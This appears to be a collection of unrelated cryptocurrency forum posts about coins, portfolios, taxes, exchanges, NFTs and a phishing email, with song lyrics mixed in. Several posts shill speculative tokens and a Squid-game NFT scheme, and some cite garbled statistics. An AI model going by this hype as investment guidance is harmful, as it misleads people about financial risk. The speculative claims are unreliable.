Most of the people in crypto do not understand decentralisation and anonymity and the benefits of such versus centralised systems that they are currently using.  


In example the system that know so much about you can easily turn you into a mindless drone making you to purchase stuff that you don't really need just by repeating same ad over and over again cutting their cost of advertising with targeted advertising to a minimum.   


Everybody thinks that they will outsmart the system. Sure you will. Of course you wont.   


The system has a whole garrison of highly educated people that understand the nature of human behaviour much more that the average user.

Weve all see the headlines about SHIB, DOGE and other coins, "*$1000 a year ago would be millions today",* but to get those gains you'd need to invest really early. 

Through this sub we now have also seen what would have happened if you had invested your money into coins like Squid, Shibafever or BabyKrypto. 

But what would have happened if you tried to keep your risk low, by investing into stabilized coins? If you would have invested $1000 a year ago into the following coins you would have:

* Tether - would be worth $1000 today
* USD Coin - would be worth $1000 today
* Dai - would be worth $1000 today

I am not saying you should invest into these coins. But the risk of losing money is really really low.

With the growing crypto community, hacks/scams occur more every day. Studies have showed that due to covid the amount of hack attempts gained exponential with 40%. The big ammount of hack post on this sub remind us of that. Also a lot of people have not enough awarenessto to spot the most ones.

&amp;#x200B;

The above screenshot shows an e-mail from trustwallet using the official e-mail adres, being cloned. Also the website being used in the email is the offical trustwallet website.  
Side note: Hackers also use this technique to fake, that they are inside YOUR email

&amp;#x200B;

https://preview.redd.it/zefw4wa9xqx71.png?width=960&amp;format=png&amp;auto=webp&amp;s=138a4b8ba1d87e038ce04b5aafdcadf01ef9ce3e

The trick in this E-mail is the button 'Verify your wallet'. When you inspect the element with right click and inspect. You will not see the trustwallet website. You wil see a link [magicbutton.app](https://magicbutton.app) , which is a tool to generate buttons for email and other uses.

&gt;You probably already guessed it, when you clik the button you will be directed to the hackers fake website, which looks exactly the same als the trustwallet website ( Hacker gives beter yield ok) . On your mobil phone you could be tricked even quicker, Because the there is a short click to open you're wallet directly.

What's your portfolio ?

My biggest % of money invested makes ETH, then ADA and BTC. 

4 months ago i started investing in crypto. ETH and BTC at the time seemed like the most obvious ones as a new trader, but as time passed my smaller coins like LRC or AMP became my number ones.

If i had $100k to invest I would probably still go with ETH or BTC since they are the most stable ones.

So what would you guys tell newer smaller investers ? Buy ETH, BTC or go for the alt coins, as they have more room to grow ?

It's one of the best coins I've ever had and it always moves up

I don't know how, but I earn 5 to 10 percent from the daily trading of this coin without even a day losing a percentage in this week,

Interestingly, yesterday, after seeing some videos on YouTube about Shiba, I bought the shiba coin and lost a lot of my portfolio because of a ridiculous meme coin.

And the conclusion I got is that maybe shib will make some people a millionaire, but a lot of people will lose their money, so it is better to buy coins like solana, bitcoin, eth, matic, ada, dot instead of this shit coins.

Because everyone will benefit from coins like these, and these coins will not have a 20% drop in a day , like a shit coin, for no reason, and besides, each of these coins is a very strong project, and ....

So it is better not to spend our money on meme coins because maby it is going to grow 100x

your thoughts?

Sometimes I read comments on different forums or comment sections about all things crypto, and it really does make me wonder if this is all going to zero. 

Today I watched a streamer compare NFTs to Amway. 

Yesterday someone from Microsoft was laughing at Web3.

A couple days ago someone pointed out how Solana is 50% VC backed. 

ETH is basically unusable given gas prices right now. 

I've heard arguments about BTC mining rewards make a PoW chain eventually die. 

The FUD is never ending. And of course I know it's a speculative asset. But strangely enough, at the end of the day, the smartest people I know are in crypto. 

Are we all just crazy though? Talking to "regular" people makes me think there is zero chance anything comes from this space.

What advantages does JASMY have compared to IOTA ? 

IOTA has been researching this for several years and struggling with the tangle. The technology in theory seems fantastic and if either of these companies will succeed it will be a big leap for crypto in general. 

MCAP of IOTA is about 3x from JASMYCOIN. how can a JASMYs investment be defended when we already have IOTA ? 

IOTA: good technology and bad management &lt;Good management and technology ???? 

If we could do a sticky on what this coin actually is it would help newcomers like me do get interested in investing, as MCAP is 1billion and we are not even listed in coinmarketcaps main list i think many will skip investing and think they lost the opportunity without any easy accessible information.

Disclaimer: i own JASMYCOIN bought at .15

To those of you who have been around multiple years / for a longer time, how does Christmas (or equivalent holidays) and New Years usually affect cryptocurrency prices?

Does it usually cause a pump, because people are usuing their holiday money/gifted money/bonuses to spend it on crypto and to have an exciting new investment at the end of the year?

Or does it usually cause a dump because people cash out instead and/or spend their money on holiday gifts and/or other investments instead?

Looking at all the "Bitcoin at 100.000+ at the End of Year" articles that are spammed every day, it would seem like the former, but does it hold up to reality? What did the reality look like in past years?

And what do you personally think how it will be this year?

Thank you and have a great weekend

Can CRO get to the price levels of BNB or FTT?

Seeing all the insane marketing push by CRO, I expect there to be adoption but how much will it actually translate to the price. BNB had BSC to push them along while I'm not sure about FTT, seems like they rode on bull pump earlier this year. 

I see the thing holding Crypto.com back is that new investors (if they actually do comparisons) starting out will still go onto Binance and Coinbase as these have been recommended for a long time in articles or YouTube.

The chart shows the value of Money Expension, Puchasing power and the respective value of inflationary money and a non inflationary alternative like Bitcoin.

It is interesting because it shows the devaluation of real estate in the wake of puchasing power. Although the value of real estate is increasing, it is not nearly enough to outpace value inflation as an investment.

Just keep that in mind and maybe adjust some of your thinking about money, real estate and the importance of Bitcoin as a good asset.

This is the chart from the [InvestAnswers](https://www.youtube.com/watch?v=Wm0w-EGtqgM) Video.

The long and short of it guys is that people can post whatever they want here really. 

&amp;#x200B;

Chill out, some people are anti-tax, some people dislike the way tax is used, some people love taxes and want more. 

&amp;#x200B;

All of these opinions can be posted here as long as there even vaguely crypto related and as crypto is seen as a way to escape bureaucracy by many its a valid topic. 

&amp;#x200B;

Stop Gatekeeping

And if it really gets to you then you care too much about what strangers on the internet type after a few bottles of red wine and a 8% pump in their favorite bag.

A long, long time ago     
I can still remember how that music     
Used to make me smile    
And I knew if I had my chance    
That I could make those people dance    
And maybe they'd be happy for a while  

But February made me shiver    
With every paper I'd deliver    
Bad news on the doorstep    
I couldn't take one more step    
I can't remember if I cried    
When I read about his widowed bride    
Something touched me deep inside    
The day the music died  

So, bye-bye, Miss American Pie    
Drove my Chevy to the levee, but the levee was dry    
And them good ol' boys were drinkin' whiskey and rye    
Singin', "This'll be the day that I die    
This'll be the day that I die"

Does anyone know whats the deal? Ive tried to find some information or news but there is nothing. It seems like PHB is just another shitcoin that you really need to avoid. As long as you dont want to gamble a bit and ready to lose all the money. Because why not? 

Phoenix Global is the blockchain that hosts next-generation consumer-focused DApps. Phoenix Oracle relays real-world asset prices to the blockchain. PHB, the Phoenix Global cryptocurrency, executes transactions on the blockchain. Phoenix Chain is sidechain-agnostic and bridges with Binance Smart Chain (BSC), Ethereum, Solana, NEO, and Tron. Phoenix Global augments Big Data-based Artificial Intelligence (AI) via Federated Learning. (C) 

Will it be the next ICP, memecoin, squid game rug pull? What do you guys think?

Guys,

&amp;#x200B;

Just a quick PSA. This is coming from a UK perspective but will be applicable in most other countries.

PAY. YOUR.TAXES.

Seriously, the HMCR will find out, they always find out. They have deep-rooted connections with the banks and now with the crypto exchanges. They know exactly how much you have and how much you receive when you sell. I know far too many people who thought they could get away with avoiding taxes and have ended up in prison. and if you know anyone who didn't pay taxes and nothing happened? all ill say is nothing happened yet (if you know what I'm saying)

And to the smart arses saying "good luck getting my seed phrases". I'll say good luck getting cashing out. you'll never get a bank account again. 

The HMRC DO NOT FUCK AROUND. they're like the Mafia. They'll follow you for the rest of your life and you'll never own a single assist again. If you think I'm being overdramatic then try it and find out. My BIL owned his own solicitors firm and tried to get away with not paying his full taxes. He spent 4 years in prison with murders and gang members. he can't even have his inheritance anymore because they'll come for it as soon as he receives it. he doesn't even have a bank account. he has to use his mothers to receive money.

So earlier this year I was invested in a lot more cryptocurrencies than I am now (around 25 vs 10 currently.

I was trying to hedge against some disaster happening with ETH2.0 by getting exposure to all the other smart contract layer 1s with some level of credibility.

But at a certain point that old "Solana is centralised" message got me to sell out of my position in SOL.

Long story short I missed out on a 5x because of some idealist crap about decentralisation. I now think a range of crypto products can survive across the whole spectrum of decentralisation from (trusted) CEXs to the most fairly distributed cryptos that anyone can mine.

Now I'm stuck trying to catch a dip in SOL because I don't want to end up sinking a load of cash in at the top. Just posting this here in case anyone can relate.

Hi all, I've still got a lot to learn about crypto and just hold a relatively small balance of stable coins. I tried to take a bit of a punt on another coin using uniswap, this involved connecting my coinbase wallet to uniswap so I could swap some ETH. Uniswap crashed a few times and somehow I ended up with a "new" wallet, which I figured was just another wallet connected to my coinbase account. 

  
I just opened the coinbase app and connected using the 12 word passphrase provided within uniswap, it's taken me to a wallet with a pretty large amount in and I don't know what I'm supposed to do now to A) get back to my (comparatively pathetic "number 2" wallet) and B) Advise this user their account has been compromised.

Theres several reasons. If youre buying one crypto its often easier to just use another crypto or swap it out to get the one you want. Thus crypto to buy crypto, people who say it has no use, well theres one. Basically self sustaining and having just one gets boring, so you can diversify your crypto. Then you have people saying its a bubble. Yet this isnt tangible companies with tangible assets relying on the housing market interest rate condition, or the supply chain etc. Very different from most stocks in that way, and even impervious on somethings.

I'm able to load my coinbase visa using USDC for zero fees, the transfer is nearly instant, and can then use that card to top off my [Crypto.com](https://Crypto.com) visa. Depending on your crypto of choice, you can get up to 4% from coinbase on the transaction. I'm only on the ruby level ($400 staked) for my [crypto.com](https://crypto.com) card, but all my purchases get me another 2% back in CRO. If you purchase the food&amp;bev gift cards thru the [crypto.com](https://crypto.com) app, you also can get another 10% back (depending on your staked CRO amount)

For example - I recently was at the grocery store and decided to see if [crypto.com](https://crypto.com) app offered a gift card for the store I was at - they did. I loaded $100 onto CB visa then added that to my [Crypto.com](https://Crypto.com) Visa. Already at $4 in rewards. Used that $100 to purchase a gift card. Another $10 in rewards. All in all, took a few minutes, instant 14% back in crypto.

Happy Friday!

Welcome to **Round 36 of the Cryptotrivial 2021 contest**!

# Question 36:  A buy or sell order which must be executed immediately in its entirety or else it will be cancelled. 

The correct answer of **Round 35** is...

# Angel Investor!

**What is a Angel Investor:**

Also called a seed or private investor, angel investors actively seek out opportunities to provide funding for entrepreneurs or start-up companies. They are often individuals with high net worth who are seeking new methods of expanding their wealth while simultaneously helping to launch an up and coming venture.

By investing, angel investors are not simply loaning funds to a project or company. Instead, they often require some percentage of ownership in the venture based on their initial investment. In some cases, the investment may occur continually, as the enterprise develops. But, it may also take place as a one-time contribution that helps the venture get started.

Angel investing tends to be beneficial for both the entrepreneur and the early investor. For example, the investor may find an opportunity to capitalize on earning interest at a rate they will not find in the standard financial market. For the entrepreneur, they are receiving funding at a level they may not otherwise have access to by applying to the typical loan entities, especially as a start-up.

Due to the risks involved, some angel investors also provide mentoring and business advice. This allows them to stimulate the ventures success, so they are more likely to profit or at least recover their investment. Such support may come in different forms, from the planning to the development stage. It may also include help with networking, marketing, and advertising.

Angel investors play a significant role in economic growth. Outside of their potential personal gains by investing in a start-up, their funding helps to launch innovative ventures. Many of which would otherwise never exist, given the limited access to traditional funding sources. These ventures, in turn, help to create jobs and contribute new products and services to the economy.

Within the blockchain industry, angel investors are often participating in private sales that precede the public or crowd sales - also known asInitial Coin Offerings or ICO events.

And as an academic and a generally curious person, it's the most excited I have been about anything in a good long while.

Thing is, learning a new language requires dictionaries, glossaries, bibliographies, exercises, stuff like that. I have gotten slowly into finance, not crypto, like a lot of other people during the various lockdowns in my country, and mostly through the process of trial and error. You know, the picking of a stock that some subreddits have said good things about, getting some money in, watching it burn, sellign in panic, then seeing it go back to green, and that feeling of shame. The works. I have been getting into crypto as a part of the wave that is getting into it after seeing all the success stories of late, but I am not, at least I hope I am not, the kind of person who only sees the good side of the coins. For each the lucky (or crazy bastards) new SHIB millionnaire, there is a SQUID pumper/sucker, and as an initiate, I do believe it is important to read and learn about past mistakes.

The point of this post, before I ramble on for too long, is this : when I first tried to buy crypto, I did so through my broker, and could not understand why my buy was dubbed "CFD". Most brokers and plaforms will have pages to help new investors get the applied language associated with crypto, but they are mostly incomplete and put there to influence potential buyers into a false sense of security, the proverbial "we are a good platform and care about you doing good :)" to get them to invest, and cashing in on the demise of their panic losses (looking at you, RobbingHood). With the wave of investors that came, that I am a part of, and the future waves that will potentially come after that, I think a centralized portal on information could be a big help to everybody. I keep seeing vastly popular threads talking about how the crypto endgoal is to become widespread soon, and the fact that r/CC is the fastest growing community this week is proof that this might very well be underway. 

YET. I treated this quest for knowledge like I do an academic exercise, and tried to find the best available ressources to help beginners (me included) not do this based on dumb luck. With the one base principle of crypto being the community, this sub seems to be a good starting point. So, with the help of this community, I'd like a simple thing : build a communal portal of easily accessible ressources to learn about crypto's different aspects, may it be "understanding the vocabulary", "understanding the project behind the crypto", "how to proceed when you are decided to start investing", "how to discern stable/shitcoins". No user of this sub, or of any platform, will have a comprehensible, definite expos on all of these at once, and that's okay. Everybody has its specialty, everyone focuses on a different aspect that they personally find more interesting, just like in academic studies.

To sum shit up, here we go : whereas platforms like Investopedia have come close to it, there is not a platform that focuses on explaning crypto to newcomers, even though it is a main, if not the main goal of the community. If there is, and this post is misinformed, then I'll take my loss and feel dumb for a good long while, and this post will stand as proof for the importance of better research. If there is not, then I very much feel that a JSTOR-type platform could be a huge gamechanger in the crypto world. 

Thanks for reading, if you have done so, and I hope we all get x100.000 return in a year or so. Minimum. And if the thing I have thought up in my coffee-deprived mind already exist, please ignore me/gossip about me next to the water cooler, thanks.

Paytm, Indias digital payments pioneer, would consider Bitcoin offerings if the nations authorities removed regulatory uncertainty surrounding the adoption of cryptocurrencies.

Bitcoin is still in a regulatory grey area if not a regulatory ban in India, Deora said. At the moment Paytm does not do Bitcoin. If it was ever to become fully legal in the country then clearly there could be offerings we could launch.

 the government has considered the adoption of crypto legislation, but the Reserve Bank of India remains highly critical and continues to advocate for its ban.

I've accumulated a small bag of dot since joining the crypto world in Feb this year. 

I've been interested in parachains since their launch on Kusama and been reading as much as I can on here since 

I've put my holdings into Moonbeam &amp; ACALA - from what I've seen these seem like safe bets for getting passed the auction

But IMO the best thing about this is that my dot is now locked away for 2 years - that means 2 years or not worrying wherever I should sell or not, as the option has now been taken away from me! 

If I get a decent return on the rewards or not will be a bonus!

Hey guys, so I currently live in Morocco (International student) and I was wondering if any of the banks here allow for purchase of crypto, particularly on Binance and CEX (the exchanges I use). I'm asking because my bank back home had a system revamp and we were issued new cards that I have not been able to use on either exchange. So I was thinking about opening a Moroccan bank account to use to buy my crypto with and what not. My home bank card works fine for transactions here but I'd also keep some funds in my Moroccan account in case of emergencies (and to avoid bank charges from atm withdrawals). Also if I no Moroccan banks allow it can I get some suggestions on how else I could buy crypto?

Hi all,

I have spent some time creating a website that shows a countdown to the Ethereum Mainnet merge with the PoS upgrade. Currently the website counts down towards 1st of June 2022 which is the speculative merge date, however, I am able to amend this on the fly. Don't take this literally! 

There are three sections to the website- main page with the countdown and a subscription box to get notified when the merge happens (done via MailChimp), about page and a ticker symbol. I might do some improvements to the timer so it displays better on mobile and so on but in the meantime it is what it is. If you have any suggestions, I am open to them

Website:  [Ethereum Merge | Home (ethereum2.page)](https://ethereum2.page/) 

Thanks for looking.

Hey everyone, So as title says pretty much, I've been producing music for over 10 years, Music has always been my true passion and it got me through some crazy rough times and my lifelong dream is to maybe one day just make a living out of it to support my kid and family (not aiming for "Pop tiktok" popularity and getting rich) I just want to be able to earn enough so I can concentrate on creating art and not sit in the office 10 hours a day like a soulless robot.   


I've got decent following on most social media platforms and streaming services but gigs were mainly where I was earning some money before Covid shit in my dreams (well, our dreams.) and streaming services pay ridiculously low royalties while they keep biggest chunk of the revenue.  


So, since I've always had passion for crypto and music of course but somehow I always kept them very separate from each other, I've been wondering, is there platforms, projects, ideas, websites, I could explore and learn about? I know, google is my friend but perhaps someone has experience with it and could give me few tips as it does get overwhelming pretty fast when I start researching it.  


Thank you and apologies for my TED Talk

I have been reading through their website and white paper off and on for the last couple days and i decided to pull the trigger and stake my left over yeildly for the 89% returns. 

Has anyone else done research on the project? They have a dex on testnet right at the moment, lets see how that compares to Tinyman once it is released. TM has it down and has been steadily updating the platform. 

If ARCC has explosive growth in the future then that will brings hundreds of millions if not billions to the Algorand ecosystem that will have ripples throughout the entire market of coins. 

So, areyou bullish, bearish, i dont care-ish about ARCC? If it stays around the same price i will be very happy with my rewards at the end of the 80 days. So its really not a loss to me if it never gets widely adopted.

I know there isnt much love here for Dfinity and the ICP token and I am prepared to be downvoted.

Just wanted to share this great decentralized Reddit like plattform running entirely on the ICP Blockchain anyway because I hope you arent missing something here because of all the hate for ICP:

[DSCVR](https://dscvr.io)

Its still in beta, but already working. You get DSCVR points for upvotes, just like moons here and NFT airdrops. 

There are some bugs left and a lot of spam, but its a great example how the future of the Internet could work.

And I know insane clown posse, Icy Pee jokes and everything about how silly the name Internet Computer is.

Ok, Some of these you will have heard of. Namely the bigger ones on this list. I'm deep into the gaming-cryptoverse so most of these will be related to gaming in some form or another.

I'm not a huge gamer anymore but I think the whole Ideology of **play to earn** will be f@#!ing massive. Just think about all the gamers that already exist. A quick google search showed me that there are **2.69 billion gamers**. Now I'm taking that number with a grain of salt but even if it were 1 billion people it would be massive. I can imagine that a lot of them wouldn't mind earning a little extra while they play. Plus big game studios are hinting that they are going to jump in on the action. And don't get me started on NFTs

Disclaimer: I see investing in crypto as a game. It keeps me sane so if you don't like the fact that **this is a game to me** maybe move on.

**I will be listing these shills in three tiers from low to high risk and one where I will be dumping all my gains.**

# My Gain HODL Investments

1. **Polkadot ($DOT)** \- As I'm investing in gaming crypto and gaming belongs to the people I thought it obvious to invest in a project that I think will be the network of the people.
2. **Moonriver ($MOVR)** \- This one doesn't have a huge market cap but they are creating a smart-contract Network on the Polkadot Ecosystem and a lot of games will be developed and others ported over to this Network in the future.

# Low Risk Investments

1. **The Sandbox ($SAND)** \- Now this one is a no-brainer this metaverse game has already overtaken Decentraland and in the past games similar to this have exploded. They have beautiful graphics and the ability to create your own Items with their Voxeditor. This one is going to scoop up all the Minecraft kids eventually. Plus Snoop-Dogg is a partner so this project is gon get high af.
2. **Enjin ($ENJ)** \- This one is just a nice big fat all-rounder gaming token that will grow with the gaming boom. NFT software for companies to manage their assets n that.

# Mid Risk Investments

1. **Verasity ($VRA)** \- This one will be big for streamers. Twitch is big. Verasity has the potential to be huge for the cryptoverse gamers.
2. **Vulcan Forged PYR** \- A gaming studio with multiple games under one roof and more to come. 
3. **Seedify.fund** **($SFUND)** \- A solid launchpad for games

# High Risk Investments

1. **DeRace ($DERC)** \- Virtual Horse Race Gambling. This one has huge potential and it's still early enough to get in. This one could go parabolic as soon as they start racing horses against each other.
2. **Dreams Quest ($DREAMS)** \- Ever heard of Magic the Gathering? Huge fanbase and many players. Now imagine that on the blockchain with the cards being NFTs just makes sense. They had their IDOs and ICOs this week and now they'll start developing. There will be an initial Pump when they release the first NFTs and then another huge pump when gameplay releases.
3. **Gaia Everworld ($GAIA)** \- Also in development and has the potential to be the World of Warcraft on Blockchain

# A Few Tipps

When looking for new games to Invest in don't go for the IDOs. Wait for them to go and for the price to go down during development and get in a bit before they go live with a feature.

Get out early. If you want to make disgusting games get out when you have your 5-10-20x after it pumped and look for the next game to invest in. Don't sit on your Tokens and wait for things to happen. Games take their time to pump out new features. And you can always get back in later.

Follow Roadmaps. Maybe even make a calendar dedicated to when stuff will be coming out.

# Shill me your games!

I'm interested in what games you have invested in or are looking at. What do you think about gaming on the blockchain as a whole? Are you bullish or do you think it is a load of false hope?

Peace out!

Bonus shill: SQUID GAME!

This might be a dumb question but Im a bit new to crypto as a whole and the internet isnt giving me the answers Im looking for. 

Could cryptocurrency ever act similarly to stock shares, i.e. as a way to invest in a company? Like instead of releasing 100,000 shares of stock, could a company release 100,000 units of their own cryptocurrency? 

I know its different than stocks in that owning crypto doesnt equal owning part of the company the way stocks does, but Im wondering if this could be a way for companies to secure public investment without having to go through the hassle of an IPO. Does cryptocurrency have the potential to eliminate the gatekeeping around traditional forms of investing?

One of the top posts in this sub being anti-libertarian is pretty laughable. I understand a lot of you guys are new and probably came purely for investment prospects but it's important to recognize the foundational ideals crypto was built upon. Otherwise, you are really missing the big picture here. Crypto has always been about freedom at its core and taxation was and will continue to be a key component of that discussion. 

If you argue for crypto without individual freedoms being your underlying theme the entire space often sounds nonsensical. Control over your wealth, freedom to transact *at your own discretion*, and trustless decentralized systems are worthless if you don't value freedom as a whole in the first place. Why would you care if you trust the centralized structures in place to do the right thing anyways? Well with taxation you're trusting them a whole hell of a lot to allocate your money appropriately despite them repeatedly failing to do so. The argument of forced taxation being theft and not being able to allocate the *fruits of your own labor* how you see fit is a totally valid topic in this conversation. 

As long as nobody is advocating for blatantly illegal behaviors I don't see why there should be any problem with the topic. We don't have to agree but pretending crypto isn't meant to be a solution against tyranny at some capacity is silly. Crypto is quite literally the thinking man's revolution. It is a stand against the system which requires no violence and is based on purely altruistic and moral foundations at the core. You're spitting on Satoshi's memory when you make posts like those imo.

Did you guys know the stock market has triggers to prevent it from falling more than 20% in a day? 

Forgive my ignorance, but why would I take part in a system that can be stopped and opened as others see fit? Yeah the concept can be applied to traffic lights and bridges, but that's an apples to oranges comparison I believe. 

If the S&amp;P 500 falls 7% below previous daily close then trading is halted for 15 minutes. 

If the S&amp;P 500 falls 13% below previous daily close then trading is halted for 30 minutes. 

If the S&amp;P 500 falls 20% below the precious daily close then trading is halted for the rest of the day. 

*The circuit breakers "are designed to slow trading down for a few minutes, to give investors the ability to understand what's happening in the market, consume the information and make decisions based on market conditions," New York Stock Exchange President Stacey Cunninghamtold CNBC.*

[Reference ](https://www.npr.org/2020/03/09/813682567/how-stock-market-circuit-breakers-work)

I'd like to know what you all think about this in relation to the stock market and how do you think the cryptospace would be with such a system.
Speaking purely from an unbiased standpoint I think it would remove a lot of volatility in the market...BUT, isn't the volatility and free trade what we all are here for anyways?

The aspect ofthe purpose of the item is made only to selland thevalue is decided by everyone, makes it also easier for theitem to be made by anyone. This idea is certainly not bad for quite a lot of neglected and side-lined artists, or those who dont have any connections in the world of art to start striving. 
There is this interesting case of a bunch of people who are really good in photoshop and the like, taking images from a real artist, cut them up digitally, putting them together in a way that it only has less than 10% of that artist work to make an NFT item. They didnt even create it themselves.
I am calling theseitemsbecause I am not sure that they are a work of art.
The real NFT art does exist and it should be more than the bunch of copy-paste collections.

Earlier this year my stock brokerage was a digital and technology focused option for Canadians. It was efficient and there were virtually zero fees unless you were trading US stocks in which case the currency exchange fee was only 1.5%.

It began offering crypto and there were initially only BTC and ETH available back in March. Late spring to early summer they added another 14 crypto options varying between LTC, DOGE, LINK, MKR, etc.

Since July 28 theyve added the likes of ZRX, MATIC, ADA, FTM, and just yesterday SHIB. They now offer 29 coins and tokens. Sure this was already a very tech forward brokerage and they make tons of money off trades, it is still overall bullish for me to see a company like this embrace crypto so much. 

At the current point they do charge a decent spread of up to 2% and they also only allow price exposure to the asset class. However they are aiming to implement a crypto withdraw capability in the near future for those using or wanting to use their platform. Their third party custodian right now is Gemini and thats who manages their digital assets. IMO this brings great crypto exposure to my fellow Canadians!

*TL;DR My stock trading platform also offers crypto exposure. Had 2 coins 6 months ago, now has 29 different cryptos.*

In mid September, the SEC threatened to sue Coinbase if it launches its then planned lending product. Even though there were similar services available, the SEC targeted Coinbase due to its size and profile to send a message. 

Cut to today and coinbase has got a hell of a message for the SEC! Come borrow a million bucks! This has made my day!

I can't stop thinking that nowadays you can become rich in an instant just by making a fortunate investment.

We  used to collect baseball cards, rare autographs of stars, statuettes  and figurines, but now there are other toys that are more expensive.  Everything is going digital, cryptocurrency. Art has gone digital - just  last year I visited more than 10 museums around the world, despite  travel restrictions - now exhibitions and the world's greatest  masterpieces are available for free, online.

Now,  whether or not a company's stock and price will rise is decided by a  single Influencer statement. This was the case after every announcement  by Jobs, now by Musk or Zuckerberg.

Metaverse token prices skyrocketed as much as 100%t after news broke Thursday that Facebook was rebranding to Meta.

MANA,  the token on which the browser-based video game Decentraland - a sort  of hybrid of Minecraft and Second Life - began trading at $3.39, up 100%  from a few days ago.

SAND, the  proprietary token for The Sandbox, a community-driven metaworld where  users can create their own NFT game worlds, rose 35% in just one day.

SAND hit a record high of $2.41 early this morning before falling 30% to its current price of $1.73.

According  to data from Zerion, the Metaverse Index token, which tracks the price  of major meta-universe tokens, rose 20% overnight and 50% over the past  week.

I've become increasingly  interested in projects that use new technology, but it's hard to guess  who's monetizing on the hype and disappearing by pulling the rug.

You've  probably all heard about the Squid Game token project. The news of the  wild growth went around the world.... to crash the market in just one  day. The project turned out to be a scam, but we all know that some of  us managed to make money on this pyramid and become millionaires, never  to return to normal life again.

I study projects to see how I can benefit from them. And I make my own rankings.

Some of them have an interesting idea at their core.

Here,  for example, is another NFT project that also uses a squid game as its  basis. And I was very interested to understand the mechanics of the  game. I did not immediately understand it, but when I figured it out -  experienced a wow effect.

Look,  first they offer to buy a player card - NFT player SquidSolGame for 1  SOL (SOL - is the currency of Solan, which is currently traded on the  market for about $ 240).

Then they will start selling NFT items. I found some kind of geometric relationship of their value there.

It starts out very interesting - the first 222 NFT items are worth up to 1 SOL

I have calculated some parts of this progression (NFT item prices) and will show you their values

&amp;#x200B;

https://preview.redd.it/g91xgmszkqx71.png?width=217&amp;format=png&amp;auto=webp&amp;s=e5d25ed34e87fc749dd7ad2b8f5a9f89fdb12e47

&amp;#x200B;

https://preview.redd.it/kl1x8hb7lqx71.png?width=212&amp;format=png&amp;auto=webp&amp;s=8898d0cff1da9be3bc88f517484f7580bb227ba1

https://preview.redd.it/4lxua788lqx71.png?width=220&amp;format=png&amp;auto=webp&amp;s=b6be120799aa13aac5486a98ee13b4c9debda7e0

https://preview.redd.it/p6boa1w9lqx71.png?width=233&amp;format=png&amp;auto=webp&amp;s=13d743e75f1b859072a6244b3e14ae995d21cf78

The 223 NFT items are equal to 1.008590198

And so the price gradually grows to 127 SOL for the last item.

I  have calculated that their sum equals about 6000 SOL, which is how much  is promised as winnings. That is, the mechanics of the game can be  followed.

There can be different strategies here.

Let's  say a lot of people will first buy 5-6 items worth up to 1 SOL, then,  someone will start buying more expensive ones. Buy and resell NFT items  from hand to hand. Closer to the end of the game, a few leaders may  emerge.

Let's say they spend about  200,000 SOL on their items and each own about 100 NFT items each. The  count will go to units of NFT items. That said, spending amounts MUCH  LESS than a million SOL would result in a million dollars. And find  yourself at a substantial gain.

Whoever  correctly redeems the last NFT items without going over the million  dollar mark will win a prize. You can make money on this game, even  without participating in the drawing of the grand prize - those who  participate, will seek to redeem the cheaper NFT items from those who  managed to buy them.

The  interesting thing is that the winner must find a strategy in which they  spend less money than the prize, but still collect as many NFT items as  possible. And it's really a game of survival, but only - financially.  Strategic. I decided to follow this Squidsolgame and see if anyone could  find a way to redeem some NFT items and get a grand prize.

Also,  very interesting, have you found anything interesting in the virtual  marketplace? Please share any case studies. I believe we have a very  interesting future ahead of us, in virtual universes.

Would you stop working if you could live off the profits of crypto? In a survey of Americans, 4% of those surveyed responded that they stopped working because of profits gained from crypto.

&amp;#x200B;

**1 in 25 quit**

Granted this question of the survey was completed by only 6741 respondents, so it is not completely representative. The results of the survey were shared on November 1 and Civic Science asked the questions in October, this month the bitcoin price reached a new all time high.

&amp;#x200B;

https://preview.redd.it/jcqjhfjzkqx71.png?width=806&amp;format=png&amp;auto=webp&amp;s=6a8c103ac43f87a33680dd15a11454ede59ecc28

&amp;#x200B;

**Income Disparity**

Billionaire Mark Cuban thinks he can explain why:

https://preview.redd.it/zrim8r01lqx71.png?width=548&amp;format=png&amp;auto=webp&amp;s=d63e207ff3b10e263036f59e7358cbc16ba6608e

&amp;#x200B;

He says the majority of those 40% earn less than $50,000 a year (43,000). 'Now we know why so many people are quitting low-paying jobs. And this was BEFORE the current run-up.' In the Netherlands the proportions are slightly different, as 43,000 euros a year is not a low-paying job here. The Centraal Planbureau estimates the modal income in 2021 at 36,500 euros gross, so with 43,000 euros you earn slightly above modal.

&amp;#x200B;

https://preview.redd.it/kfofhyv4lqx71.png?width=808&amp;format=png&amp;auto=webp&amp;s=1628ceaef1ed000c851abd84f7acb3f704edb363

Broken down by income, 27% of the "quitters" were found to earn less than $25,000 a year from their regular jobs. But it's not just low-paying jobs where crypto gives financial freedom, as many as 37% of the 'quitters' earned $50,000 per year. Civil Science concludes:

'These data imply that crypto investing can be life-changing for some income levels, while wealthier crypto owners use it more as another form of asset diversification rather than as a source of income.'

&amp;#x200B;

Top investor Mark Mobius says crypto currencies may be very entertaining, but investing in stocks is a better way to hedge against high inflation.

Crypto coins should not be seen as a way to invest, the founder of Mobius Capital Partners said Wednesday in an interview with CNBC. According to him, they are meant "for speculation and as entertainment."

"Bitcoin and the whole crypto world are a religion. It's not an investment, it's a religion," he says. "People believe in it and think they'll get richer, and that's fine. As long as the music keeps playing, it's great. But the moment the music stops, we're in big trouble."

That so-called music propelled bitcoin and ethereum, the world's two largest crypto-currencies, to record highs last month. Even meme tokens like dogecoin and shiba inu have earned a spot in the top 10 in terms of market capitalization.

But even with that in mind, equities are "definitely the answer" to inflation, which is expected to reach its highest level in ages in 2022. "You have to eventually go back to equities," Mobius told CNBC.

Mobius is a pioneer of investing in emerging markets and has previously questioned crypto currencies. In an interview with Bloomberg in September, he said that introducing bitcoin as legal tender in El Salvador is not going to work. "You don't need bitcoin, you don't need crypto coins," he said at the time.

Mobius is not the only big name in finance who is skeptical about crypto currencies. CEO Jamie Dimon of JPMorgan recently called bitcoin "worthless."

I sent around 1k worth of XLM from Coinbase to Kucoin and the memo wasnt attached even though I 100% included it. I was asked by Kucoin to pay $50 USDT to return it to Coinbase which will also have no memo so it will get lost again anyway. They have not acknowledged my payment of $50 USDT and have actually just asked me to pay it again. I am being ignored time and time again. I dont want the XLM returned to Coinbase to have to deal with the same issue upon its return as itll just be lost there too.
I havent got one clear response from them that doesnt seem like a bot.

Coinbase have maybe admitted that the memo not being attached was due to their Stellar network maintainance that was being carried out at the time of transaction. Dealing with two exchanges throwing seemingly automated responses at me is driving me INSANE. Besides that, it is Kucoins responsibility to retrieve my XLM as it is now in their account.

To summarise they are withholding around 1k worth of XLM and have ignored a payment of $50 USDT I paid to try and get my funds back. 

